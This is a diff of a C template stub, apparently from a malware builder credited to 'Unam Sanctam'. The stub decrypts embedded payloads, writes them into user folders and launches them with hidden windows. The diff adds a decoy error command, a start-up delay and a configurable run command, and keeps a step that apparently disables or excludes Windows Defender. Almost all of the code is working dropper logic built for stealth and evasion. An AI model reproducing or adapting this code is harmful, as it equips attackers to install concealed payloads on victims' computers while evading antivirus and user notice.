@@ -4,33 +4,6 @@
 
 /* Created by Unam Sanctam, https://github.com/UnamSanctam */
 
-char base46_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
-                     'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
-                     'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
-                     'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
-
-char* base64_decode(char* cipher) {
-    char counts = 0;
-    char buffer[4];
-    char* plain = malloc(strlen(cipher) * 3 / 4);
-    int i = 0, p = 0;
-    for(i = 0; cipher[i] != '\0'; i++) {
-        char k;
-        for(k = 0 ; k < 64 && base46_map[k] != cipher[i]; k++);
-        buffer[counts++] = k;
-        if(counts == 4) {
-            plain[p++] = (buffer[0] << 2) + (buffer[1] >> 4);
-            if(buffer[2] != 64)
-                plain[p++] = (buffer[1] << 4) + (buffer[2] >> 2);
-            if(buffer[3] != 64)
-                plain[p++] = (buffer[2] << 6) + buffer[3];
-            counts = 0;
-        }
-    }
-    plain[p] = '\0';
-    return plain;
-}
-
 char* cipher(char* data, long dataLen) {
 	char* key = "#KEY";
 	int keyLen = strlen(key);
@@ -50,7 +23,7 @@ int write_file(char* file, unsigned char* buffer, long length){
 	return result;
 }
 
-int run_program(char* file, char* arguments, int hidden){
+int run_program(char* file, char* arguments){
 	PROCESS_INFORMATION p_info;
 	STARTUPINFO s_info;
 
@@ -58,7 +31,7 @@ int run_program(char* file, char* arguments, int hidden){
 	memset(&p_info, 0, sizeof(p_info));
 	s_info.cb = sizeof(s_info); 
 
-	if(CreateProcess(file, arguments, NULL, NULL, FALSE, (hidden ? CREATE_NO_WINDOW : CREATE_NEW_CONSOLE), NULL, NULL, &s_info, &p_info)){
+	if(CreateProcess(file, arguments, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info)){
 		CloseHandle(p_info.hProcess);
 		CloseHandle(p_info.hThread);
 		return 1;
@@ -68,19 +41,27 @@ int run_program(char* file, char* arguments, int hidden){
 
 int main(int argc, char **argv) 
 {
+#if DefError
+	run_program(NULL, cipher("#ERRORCOMMAND", #ERRORCOMMANDLENGTH));
+#endif
+#if DefDelay
+	sleep(#DELAY * 1000);
+#endif
 #if DefWD
-	run_program(NULL, cipher("#WDCOMMAND", #WDCOMMANDLENGTH), 1);
+	run_program(NULL, cipher("#WDCOMMAND", #WDCOMMANDLENGTH));
 #endif
 	char* stringarray[#ARRAYCOUNT][3] = {#STRINGARRAY};
-	long intarray[#ARRAYCOUNT][5] = {#INTARRAY};
+	long intarray[#ARRAYCOUNT][4] = {#INTARRAY};
 
 	char commandholder[MAX_PATH+1000];
+	char runcommand[MAX_PATH+1000];
 
 	for(int i = 0; i < #ARRAYCOUNT; ++i){
 		sprintf(commandholder, "%s\\%s", getenv(stringarray[i][0]), cipher(stringarray[i][1], intarray[i][0]));
-		write_file(commandholder, base64_decode(cipher(stringarray[i][2], intarray[i][2])), intarray[i][3]);
+		write_file(commandholder, cipher(stringarray[i][2], intarray[i][2]), intarray[i][2]);
 		if(intarray[i][1]){
-			run_program(commandholder, NULL, intarray[i][4]);
+			sprintf(runcommand, "%s %s", cipher("#COMMANDRUN", #COMMANDRUNLENGTH), commandholder);
+			run_program(NULL, runcommand);
 		}
 	}
 	return 0;
